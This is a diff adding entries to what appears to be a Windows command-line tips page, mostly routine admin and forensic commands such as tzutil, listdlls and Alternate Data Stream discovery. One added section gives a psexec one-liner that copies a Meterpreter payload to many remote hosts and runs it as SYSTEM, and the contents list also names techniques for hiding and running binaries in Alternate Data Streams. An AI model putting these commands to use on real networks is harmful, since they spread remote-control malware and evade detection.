@@ -21,6 +21,13 @@
 <a id="table-of-contents" class="anchor" href="#table-of-contents" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a id="user-content-table-of-contents" href="#table-of-contents"></a>Table of Contents</h2>
 
 <ul>
+<li><a href="#Set-Time-Zone">Set Time Zone of the system clock</a></li>
+<li><a href="#Lock-Command-Line">Lock Windows desktop using command line</a></li>
+<li><a href="#Force-Meterpreter-Binary-Remote">Force copy meterpreter binary to remote machines & run as system</a></li>
+<li><a href="#Unsigned-DLL-Proccess">List unsigned dlls for a specific process</a></li>
+<li><a href="#System-Properties-Windows-Advanced">Open the System Properties window, with the 'Advanced' tab selected</a></li>
+<li><a href="#Dir-Command-Data-Stream">Using the dir command to find Alternate Data Streams</a></li>
+<li><a href="#Get-Startup-Programs-List">Get list of startup programs using wmic</a></li>
 <li><a href="#Add-Binary-Other-Data-Stream">Add a binary to an Alternate Data Stream</a></li>
 <li><a href="#Binary-Execute-using-WMIC">Execute a binary Alternate Data Stream (Win 7/ 2008) using wmic</a></li>
 <li><a href="#Remote-FTP-STart">Remotely stop/start ftp on several systems</a></li>
@@ -139,6 +146,49 @@
 </ul>
 
 <hr>
+<h3>
+<a id="Set-Time-Zone" class="anchor" href="#Set-Time-Zone" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a id="Set-Time-Zone" href="#Set-Time-Zone"></a>Set Time Zone of the system clock</h3>
+
+<pre><code>C:\&gt;tzutil /s "Eastern Standard Time"
+<br>
+List available Time zones:
+C:\> tzutil /l
+</code></pre>
+<h3>
+<a id="Lock-Command-Line" class="anchor" href="#Lock-Command-Line" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a id="Lock-Command-Line" href="#Lock-Command-Line"></a>Lock Windows desktop using command line</h3>
+
+<pre><code>C:\&gt;rundll32 user32.dll,LockWorkStation
+</code></pre>
+
+<h3>
+<a id="Force-Meterpreter-Binary-Remote" class="anchor" href="#Force-Meterpreter-Binary-Remote" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a id="Force-Meterpreter-Binary-Remote" href="#Force-Meterpreter-Binary-Remote"></a>Force copy meterpreter binary to remote machines & run as system</h3>
+
+<pre><code>C:\&gt;psexec @$ips.txt -s -u adminuser -p pass -f -c \exploits\mp.exe
+</code></pre>
+<h3>
+<a id="Unsigned-DLL-Proccess" class="anchor" href="#Unsigned-DLL-Proccess" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a id="Unsigned-DLL-Proccess" href="#Unsigned-DLL-Proccess"></a>List unsigned dlls for a specific process. For system wide list, remove the process name</h3>
+
+<pre><code>C:\&gt;listdlls -u explorer.exe
+</code></pre>
+<h3>
+<a id="System-Properties-Windows-Advanced" class="anchor" href="#System-Properties-Windows-Advanced" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a id="System-Properties-Windows-Advanced" href="#System-Properties-Windows-Advanced"></a>Open the System Properties window, with the 'Advanced' tab selected</h3>
+
+<pre><code>C:\&gt;control sysdm.cpl,,3<br>
+Change the number for different tabs.
+</code></pre>
+<h3>
+<a id="Dir-Command-Data-Stream" class="anchor" href="#Dir-Command-Data-Stream" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a id="Dir-Command-Data-Stream" href="#Dir-Command-Data-Stream"></a>Using the dir command to find Alternate Data Streams</h3>
+
+<pre><code>C:\&gt;dir /R | find ":$D"
+<br>
+Using streams #sysinternals (shows path):
+C:\> streams -s .
+</code></pre>
+<h3>
+<a id="Get-Startup-Programs-List" class="anchor" href="#Get-Startup-Programs-List" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a id="Get-Startup-Programs-List" href="#Get-Startup-Programs-List"></a>Get list of startup programs using wmic</h3>
+
+<pre><code>C:\&gt;wmic startup list full
+</code></pre>
 <h3>
 <a id="Add-Binary-Other-Data-Stream" class="anchor" href="#Add-Binary-Other-Data-Stream" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a><a id="Add-Binary-Other-Data-Stream" href="#Add-Binary-Other-Data-Stream"></a>Add a binary to an Alternate Data Stream</h3>
 
